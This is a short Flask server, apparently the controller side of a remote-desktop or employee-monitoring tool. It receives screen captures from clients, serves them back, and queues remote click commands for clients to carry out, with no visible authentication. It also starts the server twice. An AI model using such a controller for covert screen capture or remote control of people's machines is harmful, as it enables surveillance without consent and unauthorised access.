import os
import threading
from flask import Flask, Response, request, jsonify, render_template
from werkzeug.wsgi import FileWrapper
import io
from PyQt6.QtCore import QUrl
import json

app = Flask(__name__)

# Store employee data
STATE = {}

@app.route('/')
def root():
    # Render the admin control panel
    return render_template('index.html', employees=STATE)

@app.route('/new_session', methods=['POST'])
def new_session():
    req = request.get_json()
    key = req['_key']
    STATE[key] = {
        'im': b'',
        'filename': 'none.png',
        'events': []
    }
    print(f"New session created for {key}")
    return jsonify({'ok': True})

@app.route('/capture_post', methods=['POST'])
def capture_post():
    with io.BytesIO() as image_data:
        filename = list(request.files.keys())[0]
        key = filename.split('_')[1]
        request.files[filename].save(image_data)
        STATE[key]['im'] = image_data.getvalue()
        STATE[key]['filename'] = filename
    print(f"Received capture from {key}")
    return jsonify({'ok': True})

@app.route('/events_get', methods=['POST'])
def events_get():
    req = request.get_json()
    key = req['_key']
    events_to_execute = STATE[key]['events'].copy()
    STATE[key]['events'] = []
    return jsonify({'events': events_to_execute})

@app.route('/send_command', methods=['POST'])
def send_command():
    req = request.get_json()
    key = req['key']
    command = req['command']
    
    if key in STATE:
        # Add logic to handle the command and send it to the employee
        print(f"Command for {key}: {command}")
        # Example command parsing
        if command.startswith("click"):
            coords = command.split(' ')[1:]
            x, y = int(coords[0]), int(coords[1])
            # Store the event in employee's events queue
            STATE[key]['events'].append({'type': 'click', 'x': x, 'y': y})
        else:
            print("Unknown command:", command)
        return jsonify({'ok': True})
    else:
        return jsonify({'ok': False, 'error': 'Employee not found'})

@app.route('/rd', methods=['POST'])
def rd():
    req = request.get_json()
    key = req['_key']
    
    if key not in STATE:
        STATE[key] = {
            'im': b'',
            'filename': 'none.png',
            'events': []
        }

    if req['filename'] == STATE[key]['filename']:
        attachment = io.BytesIO(b'')
    else:
        attachment = io.BytesIO(STATE[key]['im'])

    w = FileWrapper(attachment)
    resp = Response(w, mimetype='text/plain', direct_passthrough=True)
    resp.headers['filename'] = STATE[key]['filename']
    
    return resp

def start_flask():
    app.run('0.0.0.0', port=5000, debug=False)

# Run Flask in a background thread
flask_thread = threading.Thread(target=start_flask, daemon=True)
flask_thread.start()

if __name__ == '__main__':
    start_flask()
